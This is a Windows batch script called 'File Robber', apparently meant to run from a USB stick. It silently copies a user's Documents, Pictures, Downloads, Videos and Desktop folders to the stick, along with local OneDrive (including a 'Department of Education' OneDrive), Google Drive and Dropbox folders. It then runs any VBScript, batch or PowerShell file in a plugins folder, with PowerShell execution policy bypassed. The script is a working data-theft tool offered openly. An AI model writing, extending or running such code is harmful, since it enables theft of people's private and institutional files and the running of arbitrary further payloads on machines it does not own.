@echo off
setlocal

echo Gathering Computer Data...

REM Get the current directory of the batch script
set "scriptdir=%~dp0"

REM Get the computer name
for /F "tokens=2 delims==." %%a in ('wmic os get csname /value') do set "computername=%%a"

REM Create the folder name with computer name
set "outputfolder=output"

echo Setting up File Robber...

REM Check if the folder already exists, if not, create it
if not exist "%scriptdir%\%outputfolder%\%computername%" (
    md "%scriptdir%\%outputfolder%\%computername%"
)

REM List of source folders to copy from
set "folders=Documents Pictures Downloads Videos Desktop"

echo Starting File Robber...
cls
echo --------------------------------------------------------------------
echo --------------------------------------------------------------------
echo FILE ROBBER BETA V0.2
echo Created by @HighSchoolProgrammer on GitHub
echo https://github.com/HighSchoolProgrammer/USB-File-Robber
echo --------------------------------------------------------------------
echo --------------------------------------------------------------------

timeout /t 3 

REM Loop through each folder, copy files, and move them to the 'OUTPUT' folder
for %%d in (%folders%) do (
    echo Copying %%d...
    xcopy "%USERPROFILE%\%%d" "%scriptdir%\%outputfolder%\%computername%\%%d" /E /I /Y
    echo Completed copying %%d
)

echo All files copied to respective folders in the "%outputfolder%" folder in: %scriptdir%

echo Attempting to get Cloud Files...

REM Cloud - OneDrive

REM Store the OneDrive folder path
set "onedrivepath=%USERPROFILE%\OneDrive"

echo Copying Personal OneDrive to USB...
REM Check if the OneDrive folder exists, then copy its contents
if exist "%onedrivepath%" (
    xcopy "%onedrivepath%" "%scriptdir%\%outputfolder%\%computername%\Cloud Files\OneDrive" /E /I /Y
) else (
    echo Personal OneDrive folder not found.
)

echo Copying DOE OneDrive to USB...
REM Check if the OneDrive folder exists, then copy its contents
if exist "%onedrivepath% - Department of Education" (
    xcopy "%onedrivepath% - Department of Education" "%scriptdir%\%outputfolder%\%computername%\Cloud Files\OneDrive - Department of Education" /E /I /Y
) else (
    echo DOE OneDrive folder not found.
)

REM Cloud - Google Drive

REM Store the Google Drive folder path
set "googledrivepath=%USERPROFILE%\Google Drive"

echo Copying Google Drive to USB...
REM Check if the OneDrive folder exists, then copy its contents
if exist "%googledrivepath%" (
    xcopy "%googledrivepath%" "%scriptdir%\%outputfolder%\%computername%\Cloud Files\Google Drive" /E /I /Y
) else (
    echo Google Drive folder not found.
)

REM Cloud - Dropbox

REM Store the Dropbox folder path
set "dropboxpath=%USERPROFILE%\Dropbox"

echo Copying Dropbox to USB...
REM Check if the OneDrive folder exists, then copy its contents
if exist "%dropboxpath%" (
    xcopy "%dropboxpath%" "%scriptdir%\%outputfolder%\%computername%\Cloud Files\Dropbox" /E /I /Y
) else (
    echo Dropbox folder not found.
)


REM ---- Plugins ----
echo Checking plugins folder...
echo Running scripts in plugins folder...

REM Set the path to the plugins folder
set "pluginsfolder=%scriptdir%\plugins"

REM Check if the plugins folder exists
if exist "%pluginsfolder%" (
    REM Loop through each file in the plugins folder
    for %%f in ("%pluginsfolder%\*") do (
        REM Checbk if the file is a script
        if "%%~xf"==".vbs" (
            echo Running VBScript: %%~nxf
            echo ----VBSCRIPT----
            cscript "%%f"
            echo ----------------
            echo Script %%~nxf executed.
        ) else if "%%~xf"==".bat" (
            echo Running batch script: %%~nxf
            echo ----BATCH SCRIPT----
            call "%%f"
            echo --------------------
            echo Script %%~nxf executed.
        ) else if "%%~xf"==".ps1" (
            echo Running PowerShell script: %%~nxf
            echo ----POWERSHELL----
            powershell -ExecutionPolicy Bypass -File "%%f"
            echo ------------------
            echo Script %%~nxf executed.
        )
    )
) else (
    echo Plugins folder not found.
)
echo All scripts in plugins folder have been executed.
REM ----------------------

echo File Robber has completed all tasks.
pause
